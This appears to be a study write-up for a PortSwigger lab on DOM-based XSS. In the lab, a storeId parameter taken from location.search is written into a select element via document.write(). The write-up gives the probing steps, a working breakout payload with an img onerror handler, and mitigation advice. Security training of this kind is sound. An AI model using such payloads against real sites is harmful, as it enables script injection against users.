# Lab04 - DOM XSS in document.write Sink Using location.search Inside a Select Element

## Objective

Exploit a DOM-Based XSS vulnerability where:

```javascript
location.search
```

is inserted into a:

```html
<select>
```

element using:

```javascript
document.write()
```

and execute:

```javascript
alert(1)
```

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | DOM-Based XSS |
| Difficulty | Apprentice |
| Source | location.search |
| Sink | document.write() |
| Context | Select Element Context |
| Platform | PortSwigger |

---

# Vulnerability Overview

The stock checker functionality reads:

```javascript
storeId
```

from:

```javascript
location.search
```

and inserts it into:

```html
<select>
```

using:

```javascript
document.write()
```

without sanitization.

---

# Source → Sink Flow

```text
location.search
        ↓
storeId Parameter
        ↓
document.write()
        ↓
<select>
        ↓
HTML Parsed
        ↓
Execution
```

---

# Analysis

## Step 1

Open any product page.

---

## Step 2

Observe stock checker.

---

## Step 3

Add parameter:

```text
storeId=carry123
```

---

URL:

```text
product?productId=1&storeId=carry123
```

---

## Step 4

Inspect page.

Observation:

```html
<option>carry123</option>
```

inside:

```html
<select>
```

---

## Step 5

Identify Context

Input appears inside:

```text
Select Element Context
```

---

## Step 6

Need To Escape

Must break out of:

```html
<select>
```

before injecting HTML.

---

# Full Payload(s) Used

## Initial Probe

```text
carry123
```

---

## Final Payload

```html
"></select><img src=1 onerror=alert(1)>
```

URL Encoded:

```text
product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>
```

---

# Why The Payload Works

Original DOM:

```html
<select>
<option>USER_INPUT</option>
</select>
```

---

Injected Payload:

```html
"></select><img src=1 onerror=alert(1)>
```

---

Result:

```html
<select>
<option></option>
</select>

<img src=1 onerror=alert(1)>
```

---

Execution Flow

```text
Break Out Of Select
        ↓
Create Image
        ↓
Image Load Fails
        ↓
onerror Fires
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Observation

JavaScript extracts:

```javascript
storeId
```

from:

```javascript
location.search
```

---

## Probe Test

Used:

```text
carry123
```

---

Observed:

```text
New Option Added
```

inside stock checker dropdown.

---

## Key Realization

Input lands inside:

```html
<select>
```

not normal HTML.

---

## Exploitation Strategy

Need to:

```text
Close Select Element
        ↓
Inject HTML
        ↓
Trigger Event Handler
```

---

Chosen Payload:

```html
"></select><img src=1 onerror=alert(1)>
```

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Avoid:

```javascript
document.write()
```

with user-controlled input.

Use:

```javascript
createElement()
textContent
```

instead.

---

# Related Theory

- 15-sources-and-sinks.md
- 16-testing-dom-xss.md

---

# Key Learnings

- DOM XSS depends heavily on context.
- Select elements require context breakout.
- document.write() is frequently exploitable.
- Always inspect the live DOM, not View Source.